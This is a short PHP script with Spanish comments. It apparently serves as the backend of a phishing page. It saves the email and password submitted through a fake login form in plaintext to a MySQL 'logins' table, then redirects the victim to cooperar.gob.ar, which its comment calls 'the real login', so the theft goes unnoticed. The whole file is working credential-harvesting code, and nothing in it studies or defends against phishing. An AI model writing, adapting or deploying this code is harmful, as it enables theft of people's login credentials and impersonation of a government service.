<?php
header('Content-Type: application/json');
require_once __DIR__ . '/../vendor/autoload.php'; // si usas PHPMailer

// Cargar .env
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__ . '/../../');
$dotenv->load();

// Conexión a MySQL
$mysqli = new mysqli(
    $_ENV['DB_HOST'], 
    $_ENV['DB_USER'], 
    $_ENV['DB_PASS'], 
    $_ENV['DB_NAME'], 
    $_ENV['DB_PORT'] ?? 3306
);

if ($mysqli->connect_error) {
    echo json_encode(['status' => 'error', 'message' => 'Error de conexión a la base de datos']);
    exit;
}

// Capturar datos del formulario
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Insertar en tabla logins
$stmt = $mysqli->prepare("INSERT INTO logins (email, password) VALUES (?, ?)");
$stmt->bind_param("ss", $email, $password);
if ($stmt->execute()) {
    echo json_encode(['status' => 'success', 'redirect_url' => 'https://cooperar.gob.ar']); // redirigir al login real
} else {
    echo json_encode(['status' => 'error', 'message' => 'No se pudo guardar el login']);
}
$stmt->close();
$mysqli->close();
